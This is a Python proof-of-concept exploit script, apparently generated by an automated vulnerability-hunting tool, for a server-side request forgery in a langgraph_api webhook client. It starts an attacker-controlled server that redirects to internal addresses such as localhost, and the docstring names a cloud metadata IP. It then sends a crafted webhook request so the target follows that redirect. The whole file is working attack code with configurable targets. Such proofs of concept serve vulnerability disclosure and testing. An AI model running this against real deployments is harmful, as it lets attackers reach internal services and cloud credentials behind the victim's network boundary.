#!/usr/bin/env python3
# PoC for langgraph_api (/home/xcy/.local/lib/python3.14/site-packages/langgraph_api)
# Path: ssrf-006
# Sink: ensure_webhook_http_client
# Auto-generated — run with: python3 ssrf_url_controlled_stored_result_ensure_webhook_http_client.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF via Redirect Bypass in langgraph_api webhook

Vulnerability: The webhook URL is user-controlled and validated only at the initial
URL. The HTTP client follows redirects (follow_redirects=True) without re-validating
the target. An attacker can host a server that redirects to internal IPs (e.g.,
127.0.0.1, 169.254.169.254), bypassing the initial URL validation.

This PoC:
1. Starts a local HTTP server that redirects to an internal IP (127.0.0.1:8080).
2. Sends a POST request to the langgraph_api webhook endpoint with the attacker's
   redirect URL as the webhook value.
3. The server receives the request and redirects to the internal target.
4. The langgraph_api client follows the redirect and makes a request to the internal
   service, demonstrating SSRF.

Usage:
    python3 poc_ssrf_redirect.py [--target TARGET_URL] [--listen-port PORT]

    Default target: http://localhost:8000/api/webhook (adjust as needed)
    Default listen port: 9999

Requirements: Python 3.6+, requests (stdlib urllib can be used instead)
"""

import argparse
import json
import sys
import threading
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, urljoin
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError

# ---------------------------------------------------------------------------
# Configuration (modify these or use command-line arguments)
# ---------------------------------------------------------------------------
DEFAULT_TARGET = "http://localhost:8000/api/webhook"  # langgraph_api webhook endpoint
DEFAULT_LISTEN_PORT = 9999
INTERNAL_TARGET = "http://127.0.0.1:8080"  # internal service to target (e.g., metadata)

# ---------------------------------------------------------------------------
# Attacker-controlled redirect server
# ---------------------------------------------------------------------------
class RedirectHandler(BaseHTTPRequestHandler):
    """HTTP server that responds with a 302 redirect to an internal IP."""

    def do_POST(self):
        """Handle POST request — respond with redirect."""
        self.send_response(302)
        self.send_header("Location", INTERNAL_TARGET)
        self.end_headers()
        # Log the request for debugging
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length) if content_length else b""
        print(f"[*] Received POST from {self.client_address}")
        print(f"[*] Headers: {dict(self.headers)}")
        if body:
            print(f"[*] Body (truncated): {body[:200]}...")
        print(f"[*] Redirecting to: {INTERNAL_TARGET}")

    def log_message(self, format, *args):
        """Suppress default logging to keep output clean."""
        pass


def start_redirect_server(port: int) -> HTTPServer:
    """Start the redirect server in a background thread."""
    server = HTTPServer(("0.0.0.0", port), RedirectHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[+] Attacker redirect server listening on port {port}")
    print(f"[+] Will redirect to internal target: {INTERNAL_TARGET}")
    return server


# ---------------------------------------------------------------------------
# Exploit trigger
# ---------------------------------------------------------------------------
def send_webhook_with_redirect(target_url: str, redirect_url: str) -> None:
    """
    Send a POST request to the langgraph_api webhook endpoint with a malicious
    webhook URL that points to our redirect server.

    The langgraph_api will:
    1. Validate the initial URL (our redirect server, which is public).
    2. Make an HTTP POST to our redirect server.
    3. Follow the 302 redirect to the internal target (SSRF).
    """
    # Craft the payload that langgraph_api expects (simplified)
    payload = {
        "webhook": redirect_url,
        "run": {"run_id": "poc-test-001"},
        "status": "completed",
        "run_started_at": "2025-01-01T00:00:00",
        "run_ended_at": "2025-01-01T00:00:01",
        "checkpoint": {"values": {"test": "poc"}},
    }

    headers = {"Content-Type": "application/json"}

    print(f"[*] Sending POST to {target_url}")
    print(f"[*] Payload webhook: {redirect_url}")
    print(f"[*] Expecting redirect to: {INTERNAL_TARGET}")

    try:
        req = Request(
            target_url,
            data=json.dumps(payload).encode("utf-8"),
            headers=headers,
            method="POST",
        )
        # Note: We do NOT follow redirects ourselves — we want to see the initial
        # response from langgraph_api. The SSRF happens on the server side.
        with urlopen(req, timeout=10) as response:
            body = response.read().decode("utf-8", errors="replace")
            print(f"[+] Response status: {response.status}")
            print(f"[+] Response body: {body[:500]}")
    except HTTPError as e:
        print(f"[!] HTTP error: {e.code} - {e.reason}")
        if e.code == 302:
            print("[*] Server returned redirect (expected if langgraph_api follows)")
        else:
            print(f"[!] Response body: {e.read().decode('utf-8', errors='replace')[:500]}")
    except URLError as e:
        print(f"[!] URL error: {e.reason}")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="PoC: SSRF via Redirect Bypass in langgraph_api webhook"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target langgraph_api webhook URL (default: {DEFAULT_TARGET})",
    )
    parser.add_argument(
        "--listen-port",
        type=int,
        default=DEFAULT_LISTEN_PORT,
        help=f"Port for attacker redirect server (default: {DEFAULT_LISTEN_PORT})",
    )
    args = parser.parse_args()

    # Validate target URL
    parsed = urlparse(args.target)
    if not parsed.scheme or not parsed.netloc:
        print(f"[!] Invalid target URL: {args.target}")
        sys.exit(1)

    # Start the redirect server
    redirect_server = start_redirect_server(args.listen_port)

    # Construct the redirect URL that langgraph_api will call
    redirect_url = f"http://localhost:{args.listen_port}/webhook"

    # Give the server a moment to start
    time.sleep(0.5)

    try:
        # Trigger the exploit
        send_webhook_with_redirect(args.target, redirect_url)
    finally:
        # Cleanup: stop the redirect server
        redirect_server.shutdown()
        print("[*] Redirect server stopped.")


if __name__ == "__main__":
    main()
